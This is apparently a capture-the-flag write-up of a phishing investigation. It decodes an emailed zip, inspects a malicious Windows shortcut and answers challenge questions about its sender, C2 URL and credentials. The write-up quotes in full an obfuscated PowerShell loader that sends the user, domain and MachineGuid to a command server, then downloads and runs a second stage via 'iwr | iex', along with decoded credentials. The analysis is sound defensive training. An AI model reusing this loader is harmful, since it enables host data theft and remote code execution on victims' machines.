# Advent of The Relics 1 - A Call from the Museum

<details>

<summary>Who is the suspicious sender of the email?</summary>

Opening the .eml file, you can see the sender email adres:

<figure><img src="../.gitbook/assets/image (1).png" alt=""><figcaption></figcaption></figure>

> eu-health@ca1e-corp.org

</details>

<details>

<summary>What is the legitimate server that initially sent the email?</summary>

<figure><img src="../.gitbook/assets/image (2).png" alt=""><figcaption></figcaption></figure>

> BG3O293MB0335.SRBL293.PROD.OUTLOOK.COM

</details>

<details>

<summary>What is the attachment filename?</summary>

<figure><img src="../.gitbook/assets/image (3).png" alt=""><figcaption></figcaption></figure>

> Health\_Clearance-December\_Archive.zip

</details>

<details>

<summary>What is the Document Code?</summary>

The email contains the following content of the attachment:

<figure><img src="../.gitbook/assets/image (5).png" alt=""><figcaption></figcaption></figure>

It seems to be Base64 encoded, so let's decode it:

```shellscript
┌──(jagerr㉿kali)-[~/Downloads/email]
└─$ base64 -d attachment-base64.txt > attachment.zip
```

The password to open the zip can be found in the base64 encoded email message, or simply in the PDF that's part of this Sherlock:

<figure><img src="../.gitbook/assets/image (6).png" alt=""><figcaption></figcaption></figure>

Password: Up7Pk99G

```shellscript
┌──(jagerr㉿kali)-[~/Downloads/email]
└─$ unzip attachment.zip 
Archive:  attachment.zip
[attachment.zip] EU_Health_Compliance_Portal.lnk password: 
  inflating: EU_Health_Compliance_Portal.lnk  
  inflating: Health_Clearance_Guidelines.pdf  
                                                                                                       
┌──(jagerr㉿kali)-[~/Downloads/email]
└─$ ls
attachment-base64.txt  EU_Health_Compliance_Portal.lnk
attachment.zip         Health_Clearance_Guidelines.pdf
```

There are 2 files inside the zip file. Let's take a look at the .lnk file.

```shellscript
┌──(jagerr㉿kali)-[~/Downloads/email]
└─$ file EU_Health_Compliance_Portal.lnk                                       
EU_Health_Compliance_Portal.lnk: MS Windows shortcut, Item id list present, 
Points to a file or directory, Has Relative path, Has command line arguments, 
Icon number=11, Unicoded, HasExpIcon, Archive, ctime=Wed Nov 12 12:54:34 2025, 
atime=Tue Dec 16 10:45:49 2025, mtime=Wed Nov 12 12:54:34 2025, 
length=455680, window=showminnoactive, IDListSize 0x020d, 
Root folder "20D04FE0-3AEA-1069-A2D8-08002B30309D", 
Volume "C:\", LocalBasePath "C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe"
```

<figure><img src="../.gitbook/assets/image (9).png" alt=""><figcaption></figcaption></figure>

Lot's of interesting things happening, but thats for another step.The .pdf seems to be an ordinary pdf file:

```shellscript
┌──(jagerr㉿kali)-[~/Downloads/email]
└─$ file Health_Clearance_Guidelines.pdf 
Health_Clearance_Guidelines.pdf: PDF document, version 1.4, 3 page(s)
```

Opening the PDF, shows the Document Code:

<figure><img src="../.gitbook/assets/image (7).png" alt=""><figcaption></figcaption></figure>

> EU-HMU-24X

</details>

<details>

<summary>What is the full URL of the C2 contacted through a POST request?</summary>

<figure><img src="../.gitbook/assets/image (8).png" alt=""><figcaption></figcaption></figure>

The POST request is send to:&#x20;

`https%3A%2F%2Fhealth%2Dstatus%2Drs%2Ecom%2Fapi%2Fv1%2Fcheckin`&#x20;

URL Decoding this leads to:

> https://health-status-rs.com/api/v1/checkin

</details>

<details>

<summary>The malicious script sent three pieces of information in the POST request. What is the registry key from which the last one is retrieved?</summary>

Let's make the script a bit more readable first:

```shellscript
Op -eXeC bYPaSs -cOmManD "$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'));
sap`s .\Health_Clearance_Guidelines.pdf;
$AX=$env:USERNAME;
$oM=[System.Uri]::UnescapeDataString('https://health-status-rs.com/api/v1/checkin');
$Bz=$env:USERDOMAIN;
$Lj=[System.Uri]::UnescapeDataString('https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=');
$Mw=(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;
$pP = @{u=$AX;d=$Bz;g=$Mw};
$Zu=(i`wr $oM -Method POST -Body $pP).Content;
$Hd = @{Authorization = Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh };
i`wr -Headers $Hd $Lj$Zu | i`ex;
"<C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe�%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe�%�
desktop-sklaobg8���6{H���T7s�Z�������PV���8���6{H���T7s�Z�������PV����  ��1SPS��XF�L8C���&�m�
m.S-1-5-21-3851990202-555444369-4010610828-100191SPS�mD��pH�H@.�=x�hH]�R�EHK�F�Bg��
```

The `$Mw` variable holds the registry key the script sends as the third piece of information. After a bit of googling the format turned out to be:

> HKLM\SOFTWARE\Microsoft\Cryptography\MachineGuid

</details>

<details>

<summary>Then the script downloads and executes a second stage from another URL. What is the domain?</summary>

```shellscript
Op -eXeC bYPaSs -cOmManD "$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'));
sap`s .\Health_Clearance_Guidelines.pdf;
$AX=$env:USERNAME;
$oM=[System.Uri]::UnescapeDataString('https://health-status-rs.com/api/v1/checkin');
$Bz=$env:USERDOMAIN;
$Lj=[System.Uri]::UnescapeDataString('https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=');
$Mw=(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;
$pP = @{u=$AX;d=$Bz;g=$Mw};
$Zu=(i`wr $oM -Method POST -Body $pP).Content;
$Hd = @{Authorization = Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh };
i`wr -Headers $Hd $Lj$Zu | i`ex;
"<C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe�%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe�%�
desktop-sklaobg8���6{H���T7s�Z�������PV���8���6{H���T7s�Z�������PV����  ��1SPS��XF�L8C���&�m�
m.S-1-5-21-3851990202-555444369-4010610828-100191SPS�mD��pH�H@.�=x�hH]�R�EHK�F�Bg��
```

> advent-of-the-relics-forum.htb.blue

</details>

<details>

<summary>A set of credentials was used to access the previous resource. Retrieve them.</summary>

```shellscript
Op -eXeC bYPaSs -cOmManD "$Bs = (-join('Basic c3','ZjX3Rlb','XA6U2','5','vd0JsY','WNrT','3V','0X','zIwM','jYh'));
sap`s .\Health_Clearance_Guidelines.pdf;
$AX=$env:USERNAME;
$oM=[System.Uri]::UnescapeDataString('https://health-status-rs.com/api/v1/checkin');
$Bz=$env:USERDOMAIN;
$Lj=[System.Uri]::UnescapeDataString('https://advent-of-the-relics-forum.htb.blue/api/v1/implant/cid=');
$Mw=(gp HKLM:\SOFTWARE\Microsoft\Cryptography).MachineGuid;
$pP = @{u=$AX;d=$Bz;g=$Mw};
$Zu=(i`wr $oM -Method POST -Body $pP).Content;
$Hd = @{Authorization = Basic c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh };
i`wr -Headers $Hd $Lj$Zu | i`ex;
"<C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe�%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe%ProgramFiles(x86)%\Microsoft\Edge\Application\msedge.exe�%�
desktop-sklaobg8���6{H���T7s�Z�������PV���8���6{H���T7s�Z�������PV����  ��1SPS��XF�L8C���&�m�
m.S-1-5-21-3851990202-555444369-4010610828-100191SPS�mD��pH�H@.�=x�hH]�R�EHK�F�Bg��
```

Let's base64 decode `c3ZjX3RlbXA6U25vd0JsYWNrT3V0XzIwMjYh` to get the credentials:

```shellscript
┌──(jagerr㉿kali)-[~/Downloads/email]
└─$ base64 -d creds.txt                             
svc_temp:SnowBlackOut_2026!
```

> ```
> svc_temp:SnowBlackOut_2026!
> ```

</details>

